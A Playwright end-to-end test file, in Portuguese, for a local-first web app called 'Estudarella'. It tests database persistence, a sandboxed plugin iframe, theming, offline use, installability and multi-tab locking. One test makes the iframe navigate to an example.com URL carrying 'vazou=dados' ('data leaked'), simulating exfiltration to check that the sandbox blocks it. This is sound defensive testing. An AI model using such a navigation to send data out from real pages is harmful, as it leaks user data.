import { expect, test } from "@playwright/test";

test("o banco local persiste entre recarregamentos", async ({ page }) => {
  await page.goto("/ajustes/diagnostico");
  await expect(page.getByTestId("db-persistent")).toHaveAttribute("data-ok", "true");
  await expect(page.getByTestId("db-files")).toHaveAttribute("data-ok", "true");

  const count = page.getByTestId("db-count");
  await expect(count).not.toHaveText("…");
  const before = Number(await count.textContent());

  await page.getByRole("button", { name: "Gravar +1" }).click();
  await expect(count).toHaveText(String(before + 1));

  await page.reload();
  await expect(page.getByTestId("db-count")).toHaveText(String(before + 1));
});

test("o plugin roda isolado, com 3D e ponte de mensagens", async ({ page }) => {
  const external: string[] = [];
  page.on("request", (request) => {
    if (!request.url().startsWith("http://localhost")) external.push(request.url());
  });

  await page.goto("/ajustes/diagnostico");
  for (const id of ["webgl", "files", "outside", "storage", "dom", "network", "rpc"]) {
    await expect(page.getByTestId(`plugin-${id}`)).toHaveAttribute("data-ok", "true");
  }

  const plugin = page.frameLocator('iframe[title="Plugin de prova"]');
  await plugin.getByRole("button", { name: "Criar card" }).click();
  await expect(plugin.locator("#status")).toContainText("Card criado");
  await expect(page.getByTestId("plugin-cards")).toHaveText("1");

  expect(external).toEqual([]);
});

test("o plugin não consegue sair para um site externo", async ({ page }) => {
  const external: string[] = [];
  page.on("request", (request) => {
    if (!request.url().startsWith("http://localhost")) external.push(request.url());
  });

  await page.goto("/ajustes/diagnostico");
  await expect(page.getByTestId("plugin-rpc")).toHaveAttribute("data-ok", "true");

  const frame = page.frames().find((f) => f.parentFrame() === page.mainFrame());
  expect(frame).toBeDefined();
  // Tentativa de vazar dados navegando o próprio iframe para fora.
  await frame?.evaluate(() => {
    location.href = "https://example.com/?vazou=dados";
  });
  await page.waitForTimeout(1000);

  expect(external).toEqual([]);
});

test("o tema escolhido é aplicado e repassado ao plugin", async ({ page }) => {
  await page.goto("/ajustes");
  await page.getByText("Escuro", { exact: true }).click();
  await expect(page.getByRole("radio", { name: "Escuro" })).toBeChecked();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "dark");

  await page.reload();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "dark");

  await page.getByRole("link", { name: "Abrir diagnóstico" }).click();
  await expect(page.getByTestId("plugin-rpc")).toHaveAttribute("data-ok", "true");
  const plugin = page.frameLocator('iframe[title="Plugin de prova"]');
  await expect(plugin.locator("html")).toHaveAttribute("style", /--bg:\s*#141316/);
});

test("funciona sem internet depois da primeira visita", async ({ page, context }) => {
  await page.goto("/");
  // Fica pronto quando o service worker terminou de guardar os arquivos do app.
  await page.evaluate(async () => {
    await navigator.serviceWorker.ready;
  });

  await context.setOffline(true);
  await page.goto("/ajustes/diagnostico");
  await expect(page.getByTestId("db-persistent")).toHaveAttribute("data-ok", "true");
  await expect(page.getByTestId("plugin-files")).toHaveAttribute("data-ok", "true");
});

test("o app é instalável (manifesto e ícones)", async ({ page, request }) => {
  await page.goto("/");
  const href = await page.locator('link[rel="manifest"]').getAttribute("href");
  expect(href).toBeTruthy();
  const manifest = await (await request.get(href as string)).json();
  expect(manifest.name).toBe("Estudarella");
  expect(manifest.display).toBe("standalone");
  for (const icon of manifest.icons) {
    expect((await request.get(icon.src)).ok(), icon.src).toBe(true);
  }
});

test("uma segunda aba espera e assume quando a primeira fecha", async ({ context }) => {
  const first = await context.newPage();
  await first.goto("/ajustes/diagnostico");
  await expect(first.getByTestId("db-persistent")).toHaveAttribute("data-ok", "true");

  const second = await context.newPage();
  await second.goto("/ajustes/diagnostico");
  await expect(second.getByText("já está aberto em outra aba")).toBeVisible();

  await first.close();
  await expect(second.getByTestId("db-persistent")).toHaveAttribute("data-ok", "true");
});
